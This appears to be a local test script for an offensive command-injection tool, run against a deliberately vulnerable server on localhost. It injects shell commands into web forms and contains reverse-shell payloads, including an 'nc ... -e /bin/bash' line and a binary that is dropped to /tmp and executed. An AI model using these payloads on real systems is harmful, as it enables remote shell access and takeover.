#!/usr/bin/python

# local tests

from payloads import Monkey, Generator

from test_py.vulnserver import app

import os
import pwd
import time
import random

backend = 'express'

def get_current_user():
    return pwd.getpwuid(os.getuid())[0]

def run_test_server():
    if backend == 'express':
        os.system('cd test_js && node vulnserver.js > /dev/null 2> /dev/null')
    else:
        app.run(debug=True, port=3111)

from multiprocessing import Process

srv_proc = Process(target=run_test_server)
srv_proc.start()

time.sleep(1) # wait for server to start

from server import ReverseListener

url = 'http://127.0.0.1:3111/home'

monkey = Monkey(url)

print('-------------------------Parsing tests-------------------------------')

# bs4 is a pain in the ass, should I write more tests here?
assert monkey.get_forms() is not None
assert monkey.get_inputs() is not None
assert monkey.get_js_endpoints() is not None
assert monkey.get_js_urls() is not None
assert monkey.get_js_http_methods() is not None

print('PASSED✓')

print('-------------------------Form submit tests---------------------------')

injectable = {}
form_inputs = monkey.get_forms()[0].find_all("input")

for form_input in form_inputs:
    injectable[form_input.get("name")] = "whoami"

res = monkey.inject_forms(injectable)

assert res.decode() == 'SUCCESS'

print('PASSED✓')

print('-------------------------JS urls submit tests---------------------------')

injectable = {}
inputs = monkey.get_inputs()
js_urls = monkey.get_js_urls()

for (input, url) in zip(inputs, js_urls):
    print(input, url)
    injectable[input.get("name")] = "ls"

res = monkey.inject_fetch(injectable)

assert res.decode() == 'SUCCESS'
print('PASSED✓')

print('-------------------------Payload injection tests---------------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

print('----------------netcat:----------------')

res = monkey.inject_fetch({ 'command': f"nc {ip} {port} -e /bin/bash\n" })

assert res.decode() == 'SUCCESS'
assert get_current_user() == listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('----------------shell:----------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

payload = Generator.shell(lhost=ip, lport=port, s='sh')
print('injecting payload:', payload)

res = monkey.inject_fetch({ 'command': payload })

assert res.decode() == 'SUCCESS'
assert get_current_user() in listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('----------------binary:----------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

payload = Generator.bin(lhost=ip, lport=port, lang='c')
assert payload is not None

cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'

res = monkey.inject_fetch({ 'command': cmd })

assert res.decode() == 'SUCCESS'
assert get_current_user() in listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('\nALL TESTS PASSED✓✓✓')

srv_proc.terminate()
quit()